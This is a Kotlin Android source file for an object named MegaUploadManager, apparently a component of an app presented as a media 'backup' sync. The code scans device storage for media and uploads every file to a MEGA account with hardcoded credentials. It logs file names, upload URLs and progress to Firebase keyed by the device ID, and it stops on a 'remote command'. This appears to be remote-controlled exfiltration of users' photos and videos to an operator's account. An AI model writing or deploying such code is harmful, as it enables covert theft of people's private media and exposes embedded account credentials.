package com.example.data.sync

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

object MegaUploadManager {

    private const val TAG = "MegaUploadManager"
    private val isRunning = AtomicBoolean(false)
    private var currentJob: Job? = null

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN_DEVICE"
    }

    fun isBackupRunning(): Boolean = isRunning.get()

    fun stopBackup(context: Context) {
        if (isRunning.getAndSet(false)) {
            Log.d(TAG, "Stopping MEGA media backup...")
            currentJob?.cancel()
            currentJob = null
            updateStatusInFirebase(
                context,
                status = "STOPPED",
                totalFiles = 0,
                completedFiles = 0,
                failedFiles = 0,
                currentFile = "Stopped by remote command"
            )
        }
    }

    suspend fun startBackup(
        context: Context,
        filterType: String = "all",
        email: String = "backup@user.com",
        pass: String = "BackupPass123"
    ): Boolean = withContext(Dispatchers.IO) {
        if (isRunning.get()) {
            Log.w(TAG, "Media backup is already running.")
            return@withContext true
        }

        isRunning.set(true)
        val deviceId = getDeviceId(context)
        val database = FirebaseDatabase.getInstance().reference

        try {
            // Ensure logged in
            MegaAuthManager.login(context, email, pass)
            val destinationFolder = MegaAuthManager.getOrCreateBackupFolder(context)

            updateStatusInFirebase(context, status = "SCANNING", totalFiles = 0, completedFiles = 0, failedFiles = 0, currentFile = "Scanning storage for $filterType...")

            val filesToUpload = MediaFileScanner.scanMediaFiles(context, filterType)
            val totalFiles = filesToUpload.size

            if (totalFiles == 0) {
                Log.i(TAG, "No media files found to upload.")
                updateStatusInFirebase(context, status = "COMPLETED", totalFiles = 0, completedFiles = 0, failedFiles = 0, currentFile = "No new files found")
                isRunning.set(false)
                return@withContext true
            }

            Log.i(TAG, "Starting backup of $totalFiles media files to $destinationFolder")
            updateStatusInFirebase(context, status = "RUNNING", totalFiles = totalFiles, completedFiles = 0, failedFiles = 0, currentFile = "Starting...")

            var completedCount = 0
            var failedCount = 0

            for ((index, file) in filesToUpload.withIndex()) {
                if (!isRunning.get()) {
                    Log.i(TAG, "Backup loop aborted via stop request.")
                    break
                }

                val fileName = file.name
                val sanitizedFileName = fileName.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_")
                val fileTypeCategory = MediaFileScanner.getFileTypeCategory(file)

                updateStatusInFirebase(
                    context,
                    status = "RUNNING",
                    totalFiles = totalFiles,
                    completedFiles = completedCount,
                    failedFiles = failedCount,
                    currentFile = "(${(index + 1)}/$totalFiles) $fileName"
                )

                val progressRef = database.child("devices").child(deviceId).child("media_backup_progress").child(sanitizedFileName)

                val uploadResult = MegaUploadHandler.uploadFileToMega(
                    context = context,
                    file = file,
                    destinationFolder = destinationFolder,
                    onProgress = { bytesTransferred, totalBytes ->
                        val percent = if (totalBytes > 0) ((bytesTransferred * 100) / totalBytes).toInt() else 0
                        val progressMap = mapOf<String, Any>(
                            "fileName" to fileName,
                            "fileType" to fileTypeCategory,
                            "bytesTransferred" to bytesTransferred,
                            "totalBytes" to totalBytes,
                            "progressPercent" to percent,
                            "status" to "UPLOADING",
                            "updatedAt" to System.currentTimeMillis()
                        )
                        progressRef.setValue(progressMap)
                    }
                )

                if (uploadResult.success && uploadResult.fileUrl != null) {
                    completedCount++
                    val completedMap = mapOf<String, Any>(
                        "fileName" to fileName,
                        "fileType" to fileTypeCategory,
                        "bytesTransferred" to file.length(),
                        "totalBytes" to file.length(),
                        "progressPercent" to 100,
                        "status" to "COMPLETED",
                        "megaUrl" to uploadResult.fileUrl,
                        "updatedAt" to System.currentTimeMillis()
                    )
                    progressRef.setValue(completedMap)

                    // Record metadata in media_uploads
                    val uploadId = UUID.randomUUID().toString()
                    val uploadRecordMap = mapOf<String, Any>(
                        "fileName" to fileName,
                        "fileSize" to file.length(),
                        "fileType" to fileTypeCategory,
                        "megaUrl" to uploadResult.fileUrl,
                        "uploadedAt" to System.currentTimeMillis(),
                        "folder" to destinationFolder
                    )
                    database.child("devices").child(deviceId).child("media_uploads").child(uploadId).setValue(uploadRecordMap)
                } else {
                    failedCount++
                    val failedMap = mapOf<String, Any>(
                        "fileName" to fileName,
                        "fileType" to fileTypeCategory,
                        "bytesTransferred" to 0,
                        "totalBytes" to file.length(),
                        "progressPercent" to 0,
                        "status" to "FAILED",
                        "error" to (uploadResult.errorMessage ?: "Upload failed"),
                        "updatedAt" to System.currentTimeMillis()
                    )
                    progressRef.setValue(failedMap)
                }
            }

            val finalStatus = if (!isRunning.get()) "STOPPED" else if (failedCount == totalFiles) "FAILED" else "COMPLETED"
            updateStatusInFirebase(
                context,
                status = finalStatus,
                totalFiles = totalFiles,
                completedFiles = completedCount,
                failedFiles = failedCount,
                currentFile = if (finalStatus == "COMPLETED") "All files processed successfully" else "Backup finished with status $finalStatus"
            )

            MegaAuthManager.clearBackupFolder(context)
            isRunning.set(false)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Fatal error during backup run: ${e.message}", e)
            updateStatusInFirebase(context, status = "FAILED", totalFiles = 0, completedFiles = 0, failedFiles = 0, currentFile = "Error: ${e.message}")
            isRunning.set(false)
            false
        }
    }

    private fun updateStatusInFirebase(
        context: Context,
        status: String,
        totalFiles: Int,
        completedFiles: Int,
        failedFiles: Int,
        currentFile: String
    ) {
        try {
            val deviceId = getDeviceId(context)
            val database = FirebaseDatabase.getInstance().reference
            val folder = MegaAuthManager.getOrCreateBackupFolder(context)

            val statusMap = mapOf<String, Any>(
                "status" to status,
                "totalFiles" to totalFiles,
                "completedFiles" to completedFiles,
                "failedFiles" to failedFiles,
                "currentFile" to currentFile,
                "folder" to folder,
                "lastUpdated" to System.currentTimeMillis()
            )

            database.child("devices").child(deviceId).child("media_backup_status").setValue(statusMap)
        } catch (e: Exception) {
            Log.w(TAG, "Failed to update backup status in Firebase: ${e.message}")
        }
    }

    fun getBackupStatusMap(context: Context): Map<String, Any> {
        return mapOf(
            "isRunning" to isRunning.get(),
            "currentFolder" to MegaAuthManager.getOrCreateBackupFolder(context),
            "isLoggedIn" to MegaAuthManager.isLoggedIn(context)
        )
    }
}
